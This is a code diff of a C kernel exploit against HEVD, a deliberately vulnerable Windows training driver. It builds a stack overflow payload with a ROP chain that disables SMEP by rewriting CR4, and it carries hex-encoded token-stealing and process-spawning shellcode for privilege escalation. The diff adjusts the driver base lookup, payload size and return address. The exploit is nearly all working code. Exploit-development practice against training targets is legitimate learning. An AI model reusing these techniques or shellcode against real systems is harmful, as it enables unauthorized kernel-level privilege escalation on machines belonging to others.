@@ -14,16 +14,22 @@ The payload is work in progress.
 #define IOCTL_CODE 0x222003
 
 // Get base of ntoskrnl.exe
-LPVOID GetNTOsBase()
+LPVOID *GetNTOsBase()
 {
     LPVOID Bases[0x1000];
     DWORD needed = 0;
-    LPVOID krnlbase = NULL;
+    LPVOID *baseAddresses = malloc(16);
     if (EnumDeviceDrivers(Bases, sizeof(Bases), &needed))
     {
-        krnlbase = Bases[0];
+        baseAddresses[0] = Bases[0];
+        /*
+        //Enumerate all driver base address until HEVD driver base
+        for (int i=0;i<sizeof(Bases);i++) {
+            printf("Driver %d: %p\n", i, Bases[i]);
+        }*/
+        baseAddresses[1] = Bases[97];
     }
-    return krnlbase;
+    return baseAddresses;
 }
 
 //Spawn cmd with elevated privileges (from: https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit)
@@ -81,7 +87,7 @@ int main()
     //char payload[2124];
 
     //Overflow Buffer in HEVD
-    char payload[2104];
+    char payload[2108];
     //Offset until EIP Overwrite
     int offsetEIP = 2080;
 
@@ -113,7 +119,7 @@ int main()
         0xff, 0x6f, 0x70, 0x65, 0x6e, 0x58};
     */
     char shellcode_cmd[] = "\x89\xe5\x83\xec\x20\x64\x8b\x1d\x24\x01\x00\x00\x8b\x9b\x50\x01\x00\x00\x8b\x9b\x7c\x01\x00\x00\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2\x52\xff\xd0";
-    char shellcode_token[] = "\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x80\x80\x00\x00\x00\x89\xc1\xba\x04\x00\x00\x00\x8b\x80\xe8\x00\x00\x00\x2d\xe8\x00\x00\x00\x39\x90\xe4\x00\x00\x00\x75\xed\x8b\x90\x2c\x01\x00\x00\x89\x91\x2c\x01\x00\x00\x61\x83\xc4\x2c\xbb\x03\x01\x00\x00\x8b\x94\x24\xf4\x00\x00\x00\xc1\xea\x04\x31\xc0\x89\xc1\x89\xc8\x5d\xc2\x08\x00";
+    char shellcode_token[] = "\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x80\x80\x00\x00\x00\x89\xc1\xba\x04\x00\x00\x00\x8b\x80\xe8\x00\x00\x00\x2d\xe8\x00\x00\x00\x39\x90\xe4\x00\x00\x00\x75\xed\x8b\x90\x2c\x01\x00\x00\x89\x91\x2c\x01\x00\x00\x61\x58\x83\xc4\x28\x5d\x50\x31\xc0\x89\xc1\x89\xc8\xc2\x08\x00";
     memset(shellcode_token, '\x90', 55);
     //char end_test_shellcode[] = "\x31\xc0\x83\xec\x04\x89\xc1\x89\xc8\x5d\xc2\x08\x00"
     /*for (int i=0; i < sizeof(shellcode_token); i++) {
@@ -137,13 +143,18 @@ int main()
 
     printf("Getting Kernel Base Address\n");
 
-    //Enumerate device drivers to get kernel address
-    //Kernel ('nt' module) base address
-    LPVOID kernelBaseAddr = GetNTOsBase();
+    //Enumerate device drivers to get kernel & HEVD driver address
+    LPVOID *baseAddresses = GetNTOsBase();
 
-    if (!kernelBaseAddr)
+    //Kernel ('nt' module) base address
+    LPVOID kernelBaseAddr = baseAddresses[0];
+
+    //HEVD driver base address
+    LPVOID hevdBaseAddr = baseAddresses[1];
+
+    if (!kernelBaseAddr || !hevdBaseAddr)
     {
-        printf("Failed to get base address :(\n");
+        printf("Failed to get base addresses :(\n");
         exit(-1);
     }
 
@@ -172,6 +183,9 @@ int main()
     //Return to normal execution (nt!IofCallDriver+0x48)
     LPVOID iofCallDriver = (LPVOID)(((INT_PTR)kernelBaseAddr) + 0x70038);
 
+    //shellcode return address: HEVD!IrpDeviceIoCtlHandler+0x56
+    LPVOID IrpDeviceIoCtlHandler = (LPVOID)(((INT_PTR)hevdBaseAddr) + 0x000440ba);
+
     printf("[*] \'pop eax; ret\'-Gadget @ 0x%x\n", popEax);
     printf("[*] \'mov cr4, eax\'-Gadget @ 0x%x\n", cr4Eax);
 
@@ -192,6 +206,8 @@ int main()
     *(INT_PTR *)(ropBuf + 4 * 3) = (INT_PTR)smepValue;
     *(INT_PTR *)(ropBuf + 4 * 4) = (INT_PTR)cr4Eax;
     *(INT_PTR *)(ropBuf + 4 * 5) = (INT_PTR)shellcode_ptr;
+    *(INT_PTR *)(ropBuf + 4 * 6) = (INT_PTR)IrpDeviceIoCtlHandler;
+
     /*
     //Enable SMEP
     *(INT_PTR *)(ropBuf + 4 * 6) = (INT_PTR)popEcx;
